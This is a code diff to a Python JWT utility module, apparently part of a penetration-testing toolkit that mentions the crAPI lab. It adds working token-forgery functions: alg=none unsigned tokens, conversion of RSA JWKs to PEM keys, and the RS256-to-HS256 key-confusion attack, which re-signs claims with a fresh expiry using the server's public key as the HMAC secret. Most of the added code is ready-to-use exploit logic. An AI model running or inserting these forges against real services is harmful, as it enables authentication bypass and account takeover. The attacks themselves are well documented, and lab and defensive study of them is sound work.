@@ -134,16 +134,101 @@ def sign(header: dict, payload: dict, secret: str) -> str:
     return f"{h}.{p}.{_b64e(sig)}"
 
 
+def none_token(header: dict, payload: dict) -> str:
+    """An UNSIGNED token from explicit claims, `alg` forced to none. The caller supplies a
+    fresh `exp` when it wants one; here we only re-encode. Accepted by any implementation
+    that trusts the header's choice of algorithm (the crAPI challenge-15 forge)."""
+    h = _b64e(json.dumps({**header, "alg": "none"}, separators=(",", ":")).encode())
+    p = _b64e(json.dumps(payload, separators=(",", ":")).encode())
+    return f"{h}.{p}."
+
+
 def alg_none_variant(token: str) -> str | None:
-    """The same claims with the signature stripped and `alg` set to none — accepted by
-    any implementation that trusts the header's choice of algorithm."""
+    """The same claims with the signature stripped and `alg` set to none."""
     parsed = decode(token)
     if parsed is None:
         return None
     header, payload, _si, _sig = parsed
-    h = _b64e(json.dumps({**header, "alg": "none"}, separators=(",", ":")).encode())
-    p = _b64e(json.dumps(payload, separators=(",", ":")).encode())
-    return f"{h}.{p}."
+    return none_token(header, payload)
+
+
+def _der_len(n: int) -> bytes:
+    """ASN.1 DER length encoding."""
+    if n < 0x80:
+        return bytes([n])
+    out = b""
+    while n:
+        out = bytes([n & 0xFF]) + out
+        n >>= 8
+    return bytes([0x80 | len(out)]) + out
+
+
+def _der_int(raw: bytes) -> bytes:
+    """A DER INTEGER from a big-endian unsigned byte string (adds a leading 0 when the
+    top bit is set, so it is not read as negative)."""
+    raw = raw.lstrip(b"\x00") or b"\x00"
+    if raw[0] & 0x80:
+        raw = b"\x00" + raw
+    return b"\x02" + _der_len(len(raw)) + raw
+
+
+def _der_seq(*chunks: bytes) -> bytes:
+    body = b"".join(chunks)
+    return b"\x30" + _der_len(len(body)) + body
+
+
+def _pem(der: bytes, label: str) -> str:
+    b64 = base64.b64encode(der).decode()
+    lines = "\n".join(b64[i:i + 64] for i in range(0, len(b64), 64))
+    return f"-----BEGIN {label}-----\n{lines}\n-----END {label}-----\n"
+
+
+# rsaEncryption OID 1.2.840.113549.1.1.1, then NULL — the AlgorithmIdentifier for SPKI.
+_RSA_ALG_ID = bytes.fromhex("300d06092a864886f70d0101010500")
+
+
+def jwk_to_pems(jwk: dict) -> list[str]:
+    """An RSA JWK ({"n","e"} base64url) rendered as PEM public keys, PURE PYTHON (no
+    `cryptography` dependency). Returns BOTH common encodings, because the RS256->HS256
+    confusion attack must present the SAME public-key bytes the server verifies with, and
+    a server may load either:
+      - SPKI / X.509 SubjectPublicKeyInfo (`-----BEGIN PUBLIC KEY-----`) — the modern
+        default (PyJWT, jose, Java's X509EncodedKeySpec);
+      - PKCS#1 RSAPublicKey (`-----BEGIN RSA PUBLIC KEY-----`) — older stacks.
+    Both are tried as the HMAC key in the forge; whichever the server used matches."""
+    try:
+        n = int.from_bytes(_b64d(jwk["n"]), "big")
+        e = int.from_bytes(_b64d(jwk["e"]), "big")
+    except Exception:
+        return []
+    if n <= 0 or e <= 0:
+        return []
+    pkcs1 = _der_seq(_der_int(n.to_bytes((n.bit_length() + 7) // 8, "big")),
+                     _der_int(e.to_bytes((e.bit_length() + 7) // 8, "big")))
+    spki = _der_seq(_RSA_ALG_ID, b"\x03" + _der_len(len(pkcs1) + 1) + b"\x00" + pkcs1)
+    return [_pem(spki, "PUBLIC KEY"), _pem(pkcs1, "RSA PUBLIC KEY")]
+
+
+def confusion_tokens(token: str, public_pems) -> list[tuple[str, str]]:
+    """(pem, forged_token) — the RS256->HS256 confusion forge. The token is re-signed as
+    HS256 using each candidate public-key PEM as the HMAC secret. A server that does not
+    pin the algorithm verifies the attacker's HMAC with its own public key (which is not
+    secret), so a claim it never issued is accepted. Only meaningful when the original
+    token is an ASYMMETRIC alg (RS/ES/PS); an HS token is already symmetric."""
+    parsed = decode(token)
+    if parsed is None:
+        return []
+    header, payload, _si, _sig = parsed
+    if not str(header.get("alg", "")).upper().startswith(("RS", "ES", "PS")):
+        return []
+    out = []
+    for pem in public_pems or ():
+        if not pem:
+            continue
+        forged = sign({**header, "alg": "HS256"},
+                      {**payload, "exp": int(time.time()) + 3600}, pem)
+        out.append((pem, forged))
+    return out
 
 
 # Claims that should never be decided by something the client holds and can rewrite.
